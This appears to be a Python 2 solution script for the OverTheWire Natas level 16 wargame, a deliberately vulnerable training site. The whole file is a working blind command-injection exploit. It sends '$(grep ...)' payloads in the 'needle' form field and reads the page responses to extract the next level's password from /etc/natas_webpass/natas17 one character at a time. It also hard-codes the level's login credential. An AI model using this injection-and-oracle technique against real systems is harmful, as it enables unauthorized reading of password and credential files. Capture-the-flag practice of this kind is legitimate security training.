#!user/bin/python

import requests

URL = "http://natas16.natas.labs.overthewire.org/index.php"
USER = "natas16"
PASS = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
POSSIBLE = ""
KEY = ""

def check_existence(value):
    r = requests.post(URL, data = {'needle':value}, auth = (USER,PASS))
    if 'injection' not in r.text:
        return True

def value_input():
    for char in CHARSET:
        if check_existence("$(grep " + char + " /etc/natas_webpass/natas17)injection") is True:
            global POSSIBLE
            POSSIBLE += char

def get_key():
    for k in range(31):
        for char in POSSIBLE:
            global KEY
            if check_existence("$(grep ^" + KEY + char + " /etc/natas_webpass/natas17)injection") is True:
                KEY += char
                print KEY
                break

def main():
    value_input()
    get_key()
    print KEY

main()
